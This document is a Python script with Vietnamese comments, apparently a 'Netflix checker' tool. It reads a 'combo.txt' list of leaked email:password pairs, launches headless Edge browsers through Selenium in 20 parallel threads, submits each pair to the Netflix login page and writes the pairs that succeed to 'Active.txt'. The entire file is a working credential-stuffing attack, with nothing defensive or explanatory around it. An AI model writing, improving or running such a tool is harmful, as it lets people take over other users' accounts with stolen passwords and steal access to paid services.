import sys
import time
from selenium import webdriver
from selenium.webdriver.edge.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from concurrent.futures import ThreadPoolExecutor, as_completed

# Đường dẫn EdgeDriver
EDGEDRIVER_PATH = "C:\\Users\\ADMIN\\Downloads\\netflix-checker\\msedgedriver.exe"

# Hàm in banner
def print_banner():
    banner = """
____   _________.___.____  __.  _____    _______  ___________.____    ._______  ___
\   \ /   /\__  |   |    |/ _| /  _  \   \      \ \_   _____/|    |   |   \   \/  /
 \   Y   /  /   |   |      <  /  /_\  \  /   |   \ |    __)  |    |   |   |\     / 
  \     /   \____   |    |  \/    |    \/    |    \|     \   |    |___|   |/     \ 
   \___/    / ______|____|__ \____|__  /\____|__  /\___  /   |_______ \___/___/\  \
            \/              \/       \/         \/     \/            \/         \_/
"""
    print(banner)

# Hàm hỏi người dùng có muốn chạy tools không
def ask_user():
    while True:
        choice = input("Bạn có muốn chạy tools không? (yes/no): ").strip().lower()
        if choice == "yes":
            print("Đang tiến hành chạy tools...\n")
            time.sleep(1)
            return True
        elif choice == "no":
            print("Thoát khỏi tools. Hẹn gặp lại!")
            sys.exit()
        else:
            print("Lựa chọn không hợp lệ. Vui lòng nhập 'yes' hoặc 'no'.")

# Hàm làm sạch file input
def clean_file(input_file, output_file):
    cleaned_accounts = []
    with open(input_file, "r") as infile:
        for line in infile:
            line = line.strip()
            if ":" in line and len(line.split(":")) == 2:
                email, password = line.split(":")
                if email and password:
                    cleaned_accounts.append(f"{email}:{password}")
    with open(output_file, "w") as outfile:
        for account in cleaned_accounts:
            outfile.write(account + "\n")
    print(f"Đã làm sạch file. Số tài khoản hợp lệ: {len(cleaned_accounts)}")

# Hàm kiểm tra tài khoản Netflix
def check_account(account):
    email, password = account.strip().split(":")
    options = webdriver.EdgeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-extensions")
    options.add_argument("--log-level=3")  # Ẩn log trình duyệt

    service = Service(EDGEDRIVER_PATH)
    driver = None
    try:
        driver = webdriver.Edge(service=service, options=options)
        driver.get("https://www.netflix.com/login")

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "userLoginId")))
        driver.find_element(By.NAME, "userLoginId").send_keys(email)
        driver.find_element(By.NAME, "password").send_keys(password + Keys.RETURN)
        time.sleep(3)

        if "browse" in driver.current_url:
            print(f"[+] Tài khoản hợp lệ: {email}")
            return f"{email}:{password}"
        else:
            print(f"[-] Tài khoản không hợp lệ: {email}")
    except TimeoutException:
        print(f"[!] Timeout: {email}")
    except WebDriverException as e:
        print(f"[!] Lỗi trình duyệt {email}: {str(e)}")
    finally:
        if driver:
            driver.quit()
    return None

# Hàm chạy kiểm tra đa luồng
def process_accounts(input_file, output_file, max_threads=20):
    results = []
    with open(input_file, "r") as file:
        accounts = [line.strip() for line in file if line.strip()]

    with ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(check_account, account) for account in accounts]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

    # Ghi kết quả vào file
    with open(output_file, "w") as f:
        for account in results:
            f.write(account + "\n")

    print(f"\nTổng số tài khoản hợp lệ: {len(results)}")
    print("Tool đã hoàn thành tất cả công việc. Chương trình sẽ kết thúc ngay bây giờ.")

# Hàm chính
def main():
    print_banner()
    if ask_user():
        raw_input_file = "combo.txt"
        cleaned_file = "cleaned_combo.txt"
        output_file = "Active.txt"
        max_threads = 20  # Số luồng tối đa

        # Làm sạch file
        clean_file(raw_input_file, cleaned_file)

        # Chạy tool kiểm tra tài khoản
        process_accounts(cleaned_file, output_file, max_threads)

if __name__ == "__main__":
    main()
